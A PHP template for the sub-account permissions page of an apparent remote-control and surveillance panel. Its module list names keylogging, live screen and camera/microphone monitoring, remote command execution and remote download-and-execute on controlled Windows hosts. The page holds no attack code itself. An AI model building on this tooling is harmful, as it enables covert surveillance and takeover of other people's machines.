<?php
defined('ABSPATH') || exit;

$sub_accounts = get_users(['meta_key' => 'watchdog_sub_account', 'meta_value' => 1]);
$perm_list    = wd_sub_perm_list();

// 模块描述与图标
$perm_meta = [
    'wd-hosts'     => ['icon' => '🖥️',  'desc' => '查看/管理受控主机列表',      'risk' => 'low'],
    'wd-logs'      => ['icon' => '📋',  'desc' => '查看键盘、登录、窗口日志',    'risk' => 'medium'],
    'wd-screen'    => ['icon' => '📺',  'desc' => '实时查看目标主机桌面画面',    'risk' => 'high'],
    'wd-camera'    => ['icon' => '📷',  'desc' => '开启摄像头和麦克风实时监控',  'risk' => 'high'],
    'wd-console'   => ['icon' => '⌨️',  'desc' => '执行 PowerShell/CMD 命令',   'risk' => 'high'],
    'wd-processes' => ['icon' => '⚙️',  'desc' => '查看和终止进程',             'risk' => 'medium'],
    'wd-files'     => ['icon' => '📁',  'desc' => '浏览、下载、上传、删除文件', 'risk' => 'high'],
    'wd-registry'  => ['icon' => '🔑',  'desc' => '读写 Windows 注册表',        'risk' => 'high'],
    'wd-winusers'  => ['icon' => '👤',  'desc' => '管理 Windows 本地用户账号',  'risk' => 'high'],
    'wd-delivery'  => ['icon' => '🚀',  'desc' => '远程下载并执行程序',         'risk' => 'critical'],
];

// 预取所有主机（用于表格显示）
global $wpdb;
$all_hosts_raw = $wpdb->get_results("SELECT id, name, status FROM {$wpdb->prefix}watchdog_hosts ORDER BY last_seen DESC", ARRAY_A) ?: [];
$host_map = [];
foreach ($all_hosts_raw as $h) $host_map[(int)$h['id']] = $h;

include WD_THEME_DIR . '/templates/partials/layout-open.php';
?>

<style>
/* ── 权限徽章 ── */
.wd-perm-tags { display: flex; flex-wrap: wrap; gap: 4px; }
.perm-badge-all  { background: rgba(63,185,80,.15);  color: #3fb950; border: 1px solid rgba(63,185,80,.3);  border-radius: 4px; padding: 2px 8px; font-size: 11px; }
.perm-badge-none { background: rgba(248,81,73,.12);  color: #f85149; border: 1px solid rgba(248,81,73,.3);  border-radius: 4px; padding: 2px 8px; font-size: 11px; }
.perm-badge      { background: rgba(88,166,255,.1);  color: #58a6ff; border: 1px solid rgba(88,166,255,.25); border-radius: 4px; padding: 2px 8px; font-size: 11px; }
/* ── 弹窗：可滚动 ── */
.wd-modal-dialog {
    display: flex !important;
    flex-direction: column !important;
    max-height: 90vh !important;
}
.wd-modal-dialog .wd-modal-body {
    overflow-y: auto !important;
    flex: 1 1 auto !important;
    min-height: 0 !important;   /* 关键：flex 子项必须允许收缩到 0 才能触发 overflow */
}
/* ── 标签页 ── */
.modal-tabs {
    display: flex; gap: 0; border-bottom: 1px solid #21262d;
    margin-bottom: 16px;
}
.modal-tab-btn {
    padding: 8px 18px; font-size: 13px; color: #7d8590;
    background: none; border: none; border-bottom: 2px solid transparent;
    cursor: pointer; transition: color .15s, border-color .15s;
    margin-bottom: -1px;
}
.modal-tab-btn:hover { color: #e6edf3; }
.modal-tab-btn.active { color: #58a6ff; border-bottom-color: #1f6feb; }
/* ── 模块卡片 ── */
.perm-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
.perm-item {
    display: flex; align-items: flex-start; gap: 10px;
    background: #161b22; border: 1px solid #21262d;
    border-radius: 6px; padding: 10px 12px; cursor: pointer;
    transition: border-color .15s;
}
.perm-item:hover  { border-color: #30363d; }
.perm-item.active { border-color: #1f6feb; background: rgba(31,111,235,.08); }
.perm-item-icon   { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
.perm-item-body   { flex: 1; min-width: 0; }
.perm-item-name   { font-size: 13px; font-weight: 600; color: #e6edf3; }
.perm-item-desc   { font-size: 11px; color: #7d8590; margin-top: 2px; }
.perm-item-cb     { flex-shrink: 0; margin-top: 2px; }
.perm-item-cb input { width: 16px; height: 16px; cursor: pointer; accent-color: #1f6feb; }
/* 风险徽章 */
.risk-low      { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: rgba(63,185,80,.15);   color: #3fb950; border: 1px solid rgba(63,185,80,.3);  margin-left: 5px; }
.risk-medium   { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: rgba(227,179,65,.15);  color: #e3b341; border: 1px solid rgba(227,179,65,.3); margin-left: 5px; }
.risk-high     { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: rgba(248,81,73,.12);   color: #f85149; border: 1px solid rgba(248,81,73,.3);  margin-left: 5px; }
.risk-critical { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: rgba(188,40,244,.15);  color: #d2a8ff; border: 1px solid rgba(188,40,244,.3); margin-left: 5px; }
/* ── 主机列表 ── */
.host-list { display: flex; flex-direction: column; gap: 6px; }
.host-item {
    display: flex; align-items: center; gap: 10px;
    padding: 9px 12px; background: #161b22;
    border: 1px solid #21262d; border-radius: 6px;
    cursor: pointer; transition: border-color .15s;
}
.host-item:hover  { border-color: #30363d; }
.host-item.active { border-color: #1f6feb; background: rgba(31,111,235,.08); }
.host-item-dot    { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
.host-item-dot.online  { background: #3fb950; }
.host-item-dot.offline { background: #f85149; }
.host-item-name   { flex: 1; font-size: 13px; color: #e6edf3; }
.host-item-status { font-size: 11px; color: #7d8590; }
.host-all-hint    { font-size: 12px; color: #7d8590; margin-top: 8px; }
.host-loading     { text-align: center; color: #7d8590; padding: 20px; font-size: 13px; }
</style>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">子账号管理</h1>
    <button class="wd-btn wd-btn--primary" onclick="openCreateModal()">+ 创建子账号</button>
  </div>

  <div id="wd-page-notice" style="display:none" class="wd-notice"></div>

  <div class="wd-card">
    <div class="wd-card-body wd-p0">
      <table class="wd-table">
        <thead>
          <tr>
            <th>用户名</th>
            <th>邮箱</th>
            <th>可访问模块</th>
            <th>可访问主机</th>
            <th>注册时间</th>
            <th style="width:120px">操作</th>
          </tr>
        </thead>
        <tbody>
          <?php if (empty($sub_accounts)): ?>
            <tr><td colspan="6" class="wd-center wd-muted">暂无子账号，点击右上角创建</td></tr>
          <?php else: ?>
            <?php foreach ($sub_accounts as $u):
                $raw_perms   = get_user_meta($u->ID, 'watchdog_permissions', true);
                $user_perms  = ($raw_perms !== '' && $raw_perms !== false)
                               ? (json_decode($raw_perms, true) ?: [])
                               : array_keys($perm_list);
                $perm_labels = array_map(fn($k) => $perm_list[$k] ?? $k,
                               array_intersect($user_perms, array_keys($perm_list)));
                $raw_hosts   = get_user_meta($u->ID, 'watchdog_allowed_hosts', true);
                $allow_host_ids = ($raw_hosts !== '' && $raw_hosts !== false)
                               ? (json_decode($raw_hosts, true) ?: null)
                               : null;
            ?>
              <tr>
                <td><strong><?= esc_html($u->user_login) ?></strong></td>
                <td class="wd-sm"><?= esc_html($u->user_email) ?></td>
                <td>
                  <div class="wd-perm-tags">
                    <?php if (count($user_perms) >= count($perm_list)): ?>
                      <span class="perm-badge-all">● 全部模块</span>
                    <?php elseif (empty($perm_labels)): ?>
                      <span class="perm-badge-none">● 无权限</span>
                    <?php else: ?>
                      <?php foreach (array_slice($user_perms, 0, 3) as $slug):
                          $ico = $perm_meta[$slug]['icon'] ?? '📌';
                          $lbl = $perm_list[$slug] ?? $slug;
                      ?>
                        <span class="perm-badge"><?= $ico ?> <?= esc_html($lbl) ?></span>
                      <?php endforeach; ?>
                      <?php if (count($user_perms) > 3): ?>
                        <span class="perm-badge" style="color:#7d8590;border-color:#21262d">+<?= count($user_perms) - 3 ?> 项</span>
                      <?php endif; ?>
                    <?php endif; ?>
                  </div>
                </td>
                <td class="wd-sm">
                  <?php if ($allow_host_ids === null): ?>
                    <span class="perm-badge-all">● 全部主机</span>
                  <?php elseif (empty($allow_host_ids)): ?>
                    <span class="perm-badge-none">● 无主机</span>
                  <?php else: ?>
                    <div class="wd-perm-tags">
                      <?php foreach (array_slice($allow_host_ids, 0, 2) as $hid):
                          $hn = $host_map[(int)$hid]['name'] ?? "ID:$hid"; ?>
                        <span class="perm-badge">🖥️ <?= esc_html($hn) ?></span>
                      <?php endforeach; ?>
                      <?php if (count($allow_host_ids) > 2): ?>
                        <span class="perm-badge" style="color:#7d8590;border-color:#21262d">+<?= count($allow_host_ids) - 2 ?> 台</span>
                      <?php endif; ?>
                    </div>
                  <?php endif; ?>
                </td>
                <td class="wd-sm wd-muted"><?= esc_html(substr($u->user_registered, 0, 10)) ?></td>
                <td>
                  <div style="display:flex;gap:6px">
                    <button class="wd-btn wd-btn--xs wd-btn--ghost perm-btn"
                      data-uid="<?= $u->ID ?>"
                      data-name="<?= esc_attr($u->user_login) ?>"
                      data-perms="<?= esc_attr(wp_json_encode($user_perms)) ?>"
                      data-hosts="<?= esc_attr(wp_json_encode($allow_host_ids)) ?>">
                      ✏️ 权限
                    </button>
                    <button class="wd-btn wd-btn--xs wd-btn--danger"
                      onclick="WD.confirm('确定删除账号「<?= esc_js($u->user_login) ?>」？此操作不可撤销。',()=>deleteAccount(<?= $u->ID ?>))">
                      删除
                    </button>
                  </div>
                </td>
              </tr>
            <?php endforeach; ?>
          <?php endif; ?>
        </tbody>
      </table>
    </div>
  </div>
</div>

<!-- ── 创建子账号弹窗 ── -->
<div class="wd-modal" id="create-account-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('create-account-modal')"></div>
  <div class="wd-modal-dialog" style="max-width:600px;width:96vw;max-height:90vh;display:flex;flex-direction:column">
    <div class="wd-modal-header" style="flex-shrink:0">
      <h3>创建子账号</h3>
      <button class="wd-modal-close" onclick="closeModal('create-account-modal')">✕</button>
    </div>
    <div id="create-form" style="display:flex;flex-direction:column;flex:1 1 auto;min-height:0;overflow:hidden">
      <div class="wd-modal-body" style="padding:20px;overflow-y:auto;flex:1 1 auto;min-height:0">
        <!-- 基本信息 -->
        <div class="wd-form-row" style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
          <div class="wd-form-group">
            <label class="wd-label">用户名 <span class="wd-required">*</span></label>
            <input type="text" name="username" id="create-username" class="wd-input" autocomplete="off" placeholder="英文字母/数字">
          </div>
          <div class="wd-form-group">
            <label class="wd-label">邮箱 <span class="wd-required">*</span></label>
            <input type="email" name="email" id="create-email" class="wd-input" placeholder="example@mail.com">
          </div>
        </div>
        <div class="wd-form-group" style="margin-bottom:18px">
          <label class="wd-label">密码 <span class="wd-required">*</span></label>
          <input type="password" name="password" id="create-password" class="wd-input" minlength="8" placeholder="至少 8 位">
        </div>

        <!-- 标签页 -->
        <div class="modal-tabs" id="create-tabs">
          <button type="button" class="modal-tab-btn active" onclick="switchCreateTab('modules',this)">🧩 模块权限</button>
          <button type="button" class="modal-tab-btn" onclick="switchCreateTab('hosts',this)">🖥️ 可访问主机</button>
        </div>

        <!-- 模块面板 -->
        <div id="create-panel-modules">
          <div class="perm-grid" id="create-perm-grid">
            <?php foreach ($perm_list as $slug => $label):
                $meta = $perm_meta[$slug] ?? ['icon' => '📌', 'desc' => '', 'risk' => 'low'];
                $risk_label = ['low'=>'低风险','medium'=>'中','high'=>'高','critical'=>'危险'][$meta['risk']] ?? '';
            ?>
              <div class="perm-item active" data-slug="<?= esc_attr($slug) ?>"
                   onclick="toggleCreatePerm(this)">
                <div class="perm-item-icon"><?= $meta['icon'] ?></div>
                <div class="perm-item-body">
                  <div class="perm-item-name">
                    <?= esc_html($label) ?>
                    <span class="risk-<?= $meta['risk'] ?>"><?= $risk_label ?></span>
                  </div>
                  <div class="perm-item-desc"><?= esc_html($meta['desc']) ?></div>
                </div>
                <div class="perm-item-cb">
                  <input type="checkbox" class="create-perm-check" value="<?= esc_attr($slug) ?>" checked onclick="event.stopPropagation()">
                </div>
              </div>
            <?php endforeach; ?>
          </div>
          <div style="display:flex;gap:8px;margin-top:10px">
            <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setCreatePerms(true)">全选</button>
            <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setCreatePerms(false)">全不选</button>
          </div>
        </div>

        <!-- 主机面板 -->
        <div id="create-panel-hosts" style="display:none">
          <p class="wd-sm wd-muted" style="margin-bottom:10px">不勾选任何主机 = 允许访问全部主机（默认）</p>
          <div id="create-host-list" class="host-list">
            <div class="host-loading">加载主机列表...</div>
          </div>
          <div style="display:flex;gap:8px;margin-top:10px">
            <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setCreateHosts(true)">全选</button>
            <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setCreateHosts(false)">全不选</button>
          </div>
        </div>
      </div>
      <div class="wd-modal-footer" style="flex-shrink:0">
        <button type="button" class="wd-btn wd-btn--ghost" onclick="closeModal('create-account-modal')">取消</button>
        <button type="button" class="wd-btn wd-btn--primary" id="create-submit-btn" onclick="submitCreate()">创建账号</button>
      </div>
    </div>
  </div>
</div>

<!-- ── 权限编辑弹窗 ── -->
<div class="wd-modal" id="perm-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('perm-modal')"></div>
  <div class="wd-modal-dialog" style="max-width:600px;width:96vw;max-height:90vh;display:flex;flex-direction:column">
    <div class="wd-modal-header" style="flex-shrink:0">
      <h3>编辑权限 — <span id="perm-modal-name" style="color:#58a6ff"></span></h3>
      <button class="wd-modal-close" onclick="closeModal('perm-modal')">✕</button>
    </div>
    <div class="wd-modal-body" style="padding:20px;overflow-y:auto;flex:1 1 auto;min-height:0">
      <!-- 标签页 -->
      <div class="modal-tabs" id="edit-tabs">
        <button type="button" class="modal-tab-btn active" onclick="switchEditTab('modules',this)">🧩 模块权限</button>
        <button type="button" class="modal-tab-btn" onclick="switchEditTab('hosts',this)">🖥️ 可访问主机</button>
      </div>

      <!-- 模块面板 -->
      <div id="edit-panel-modules">
        <p class="wd-sm wd-muted" style="margin-bottom:12px">勾选该账号可以访问的模块。管理员专属功能不可分配给子账号。</p>
        <div class="perm-grid" id="edit-perm-grid">
          <?php foreach ($perm_list as $slug => $label):
              $meta = $perm_meta[$slug] ?? ['icon' => '📌', 'desc' => '', 'risk' => 'low'];
              $risk_label = ['low'=>'低风险','medium'=>'中','high'=>'高','critical'=>'危险'][$meta['risk']] ?? '';
          ?>
            <div class="perm-item" data-slug="<?= esc_attr($slug) ?>"
                 onclick="toggleEditPerm(this)">
              <div class="perm-item-icon"><?= $meta['icon'] ?></div>
              <div class="perm-item-body">
                <div class="perm-item-name">
                  <?= esc_html($label) ?>
                  <span class="risk-<?= $meta['risk'] ?>"><?= $risk_label ?></span>
                </div>
                <div class="perm-item-desc"><?= esc_html($meta['desc']) ?></div>
              </div>
              <div class="perm-item-cb">
                <input type="checkbox" class="perm-check" value="<?= esc_attr($slug) ?>" onclick="event.stopPropagation()">
              </div>
            </div>
          <?php endforeach; ?>
        </div>
        <div style="display:flex;gap:8px;margin-top:12px">
          <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setAllPerms(true)">全选</button>
          <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setAllPerms(false)">全不选</button>
          <span id="perm-count" class="wd-sm wd-muted" style="margin-left:auto;align-self:center"></span>
        </div>
      </div>

      <!-- 主机面板 -->
      <div id="edit-panel-hosts" style="display:none">
        <p class="wd-sm wd-muted" style="margin-bottom:10px">不勾选任何主机 = 允许访问全部主机</p>
        <div id="edit-host-list" class="host-list">
          <div class="host-loading">加载主机列表...</div>
        </div>
        <div style="display:flex;gap:8px;margin-top:10px">
          <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setEditHosts(true)">全选</button>
          <button type="button" class="wd-btn wd-btn--xs wd-btn--ghost" onclick="setEditHosts(false)">全不选</button>
          <span id="edit-host-count" class="wd-sm wd-muted" style="margin-left:auto;align-self:center"></span>
        </div>
      </div>
    </div>
    <div class="wd-modal-footer" style="flex-shrink:0">
      <button type="button" class="wd-btn wd-btn--ghost" onclick="closeModal('perm-modal')">取消</button>
      <button type="button" class="wd-btn wd-btn--primary" id="perm-save-btn" onclick="savePerms()">保存权限</button>
    </div>
  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = '子账号管理';

let _permUserId = 0;
let _allHosts   = null; // 缓存主机列表

// 权限按钮事件委托
document.addEventListener('click', function(e) {
    const btn = e.target.closest('.perm-btn');
    if (!btn) return;
    const uid   = parseInt(btn.dataset.uid);
    const name  = btn.dataset.name;
    const perms = JSON.parse(btn.dataset.perms || '[]');
    const hosts = JSON.parse(btn.dataset.hosts || 'null'); // null = all
    openPermModal(uid, name, perms, hosts);
});

// ── 主机列表加载 ─────────────────────────────────────────────────────
async function _loadHosts() {
    if (_allHosts) return _allHosts;
    const r = await WD.ajax('wd_get_all_hosts_admin', {}, 'GET');
    _allHosts = r.success ? (r.data || []) : [];
    return _allHosts;
}

function _buildHostItems(containerId, checkedIds /* int[]|null */, cbClass) {
    const container = document.getElementById(containerId);
    if (!_allHosts || _allHosts.length === 0) {
        container.innerHTML = '<div class="host-loading">暂无注册主机</div>';
        return;
    }
    container.innerHTML = _allHosts.map(h => {
        const on  = checkedIds ? checkedIds.includes(parseInt(h.id)) : false;
        const dot = h.status === 'online' ? 'online' : 'offline';
        return `<label class="host-item ${on ? 'active' : ''}" onclick="_toggleHostItem(this)">
            <span class="host-item-dot ${dot}"></span>
            <span class="host-item-name">${h.name || 'Host #'+h.id}</span>
            <span class="host-item-status">${h.status === 'online' ? '● 在线' : '○ 离线'}</span>
            <input type="checkbox" class="${cbClass}" value="${h.id}" ${on ? 'checked' : ''} onclick="event.stopPropagation()" style="width:15px;height:15px;accent-color:#1f6feb;margin-left:8px">
        </label>`;
    }).join('');
}

function _toggleHostItem(el) {
    const cb = el.querySelector('input[type=checkbox]');
    cb.checked = !cb.checked;
    el.classList.toggle('active', cb.checked);
    _updateEditHostCount();
}

function _updateEditHostCount() {
    const total   = document.querySelectorAll('.edit-host-check').length;
    const checked = document.querySelectorAll('.edit-host-check:checked').length;
    const el = document.getElementById('edit-host-count');
    if (el) el.textContent = checked === 0 ? '不限（全部主机）' : `已选 ${checked} / ${total} 台`;
}

// ── 创建弹窗 ────────────────────────────────────────────────────────
async function openCreateModal() {
    // 重置 tabs
    switchCreateTab('modules', document.querySelector('#create-tabs .modal-tab-btn'));
    openModal('create-account-modal');
    // 预加载主机
    if (!_allHosts) {
        await _loadHosts();
        _buildHostItems('create-host-list', [], 'create-host-check');
    }
}

function switchCreateTab(tab, btn) {
    document.querySelectorAll('#create-tabs .modal-tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('create-panel-modules').style.display = tab === 'modules' ? '' : 'none';
    document.getElementById('create-panel-hosts').style.display   = tab === 'hosts'   ? '' : 'none';
    if (tab === 'hosts' && _allHosts && document.querySelector('.create-host-check') === null) {
        _buildHostItems('create-host-list', [], 'create-host-check');
    }
}

function toggleCreatePerm(el) {
    el.classList.toggle('active');
    el.querySelector('.create-perm-check').checked = el.classList.contains('active');
}
function setCreatePerms(val) {
    document.querySelectorAll('#create-perm-grid .perm-item').forEach(el => {
        el.classList.toggle('active', val);
        el.querySelector('.create-perm-check').checked = val;
    });
}
function setCreateHosts(val) {
    document.querySelectorAll('.create-host-check').forEach(cb => {
        cb.checked = val;
        cb.closest('.host-item').classList.toggle('active', val);
    });
}
async function submitCreate() {
    const username  = document.getElementById('create-username')?.value?.trim();
    const email     = document.getElementById('create-email')?.value?.trim();
    const password  = document.getElementById('create-password')?.value;

    if (!username || !email || !password) {
        WD.toast('请填写用户名、邮箱和密码', 'error'); return;
    }
    if (password.length < 8) {
        WD.toast('密码至少 8 位', 'error'); return;
    }

    const perms      = [...document.querySelectorAll('.create-perm-check:checked')].map(c => c.value);
    const hostChecked = [...document.querySelectorAll('.create-host-check:checked')].map(c => parseInt(c.value));

    const btn = document.getElementById('create-submit-btn');
    btn.disabled = true; btn.textContent = '创建中...';

    const r = await WD.ajax('wd_create_sub_account', {
        username,
        email,
        password,
        init_perms: JSON.stringify(perms),
        init_hosts: hostChecked.length > 0 ? JSON.stringify(hostChecked) : '',
    }, 'POST');

    btn.disabled = false; btn.textContent = '创建账号';

    if (r.success) {
        WD.toast(r.data?.message || '子账号创建成功 ✓', 'success');
        closeModal('create-account-modal');
        location.reload();
    } else {
        WD.toast(r.data?.message || '创建失败，请重试', 'error');
    }
}

// ── 编辑弹窗 ─────────────────────────────────────────────────────────
async function openPermModal(uid, name, currentPerms, allowedHosts) {
    _permUserId = uid;
    document.getElementById('perm-modal-name').textContent = name;
    // 重置 tab
    switchEditTab('modules', document.querySelector('#edit-tabs .modal-tab-btn'));
    // 填充模块
    document.querySelectorAll('#edit-perm-grid .perm-item').forEach(el => {
        const on = currentPerms.includes(el.dataset.slug);
        el.classList.toggle('active', on);
        el.querySelector('.perm-check').checked = on;
    });
    _updatePermCount();
    openModal('perm-modal');
    // 异步加载主机并填充
    await _loadHosts();
    _buildHostItems('edit-host-list', allowedHosts, 'edit-host-check');
    _updateEditHostCount();
}

function switchEditTab(tab, btn) {
    document.querySelectorAll('#edit-tabs .modal-tab-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('edit-panel-modules').style.display = tab === 'modules' ? '' : 'none';
    document.getElementById('edit-panel-hosts').style.display   = tab === 'hosts'   ? '' : 'none';
}

function toggleEditPerm(el) {
    el.classList.toggle('active');
    el.querySelector('.perm-check').checked = el.classList.contains('active');
    _updatePermCount();
}
function setAllPerms(val) {
    document.querySelectorAll('#edit-perm-grid .perm-item').forEach(el => {
        el.classList.toggle('active', val);
        el.querySelector('.perm-check').checked = val;
    });
    _updatePermCount();
}
function setEditHosts(val) {
    document.querySelectorAll('.edit-host-check').forEach(cb => {
        cb.checked = val;
        cb.closest('.host-item').classList.toggle('active', val);
    });
    _updateEditHostCount();
}
function _updatePermCount() {
    const total   = document.querySelectorAll('.perm-check').length;
    const checked = document.querySelectorAll('.perm-check:checked').length;
    document.getElementById('perm-count').textContent = `已选 ${checked} / ${total} 个模块`;
}

async function savePerms() {
    const btn   = document.getElementById('perm-save-btn');
    const perms = [...document.querySelectorAll('.perm-check:checked')].map(c => c.value);
    const hostChecked = [...document.querySelectorAll('.edit-host-check:checked')].map(c => parseInt(c.value));
    btn.disabled = true; btn.textContent = '保存中...';
    const r = await WD.ajax('wd_update_sub_perms', {
        user_id: _permUserId,
        perms:   JSON.stringify(perms),
        hosts:   JSON.stringify(hostChecked), // 空数组 = 允许全部
    }, 'POST');
    btn.disabled = false; btn.textContent = '保存权限';
    if (r.success) {
        WD.toast('权限已更新 ✓');
        closeModal('perm-modal');
        location.reload();
    } else {
        WD.toast(r.data?.message || '保存失败', 'error');
    }
}

async function deleteAccount(id) {
    const r = await WD.ajax('wd_delete_account', { user_id: id }, 'POST');
    if (r.success) { WD.toast('账号已删除'); location.reload(); }
    else WD.toast(r.data?.message || '删除失败', 'error');
}
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
